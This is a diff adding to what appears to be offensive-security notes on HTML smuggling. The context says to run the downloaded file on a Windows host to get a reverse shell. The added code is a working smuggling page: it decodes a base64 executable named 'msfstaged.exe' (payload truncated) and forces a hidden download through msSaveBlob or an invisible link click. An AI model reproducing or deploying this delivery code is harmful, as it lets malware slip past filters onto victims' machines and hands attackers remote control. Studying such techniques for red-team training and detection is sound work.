@@ -65,3 +65,42 @@ Note that we chose to browse to the HTML file with Google Chrome since it suppor
 ### Then inside our window host just keep the file anyway and run it to get the reverse shell
 
 <figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 10.16.52 in the morning.png" alt=""><figcaption></figcaption></figure>
+
+HTML smuggling code that first attempts to use `window.navigator.msSaveBlob` (for Microsoft Edge / Internet Explorer fallback) and falls back to the dynamic anchor download method for modern browsers.
+
+```jsx
+<html>
+    <body>
+        <script>
+          function base64ToArrayBuffer(base64) {
+              var binary_string = window.atob(base64);
+              var len = binary_string.length;
+              var bytes = new Uint8Array(len);
+              for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+              return bytes.buffer;
+          }
+          
+          var file = 'TVqQ<SNIP>AAA';
+          var data = base64ToArrayBuffer(file);
+          var blob = new Blob([data], {type: 'octet/stream'});
+          var fileName = 'msfstaged.exe';
+          
+          // Check for msSaveBlob support (used in older Edge and IE)
+          if (window.navigator && window.navigator.msSaveBlob) {
+              window.navigator.msSaveBlob(blob, fileName);
+          } else {
+              // Fallback for modern browsers
+              var a = document.createElement('a');
+              document.body.appendChild(a);
+              a.style = 'display: none';
+              var url = window.URL.createObjectURL(blob);
+              a.href = url;
+              a.download = fileName;
+              a.click();
+              window.URL.revokeObjectURL(url);
+          }
+        </script>
+    </body>
+</html>
+
+```
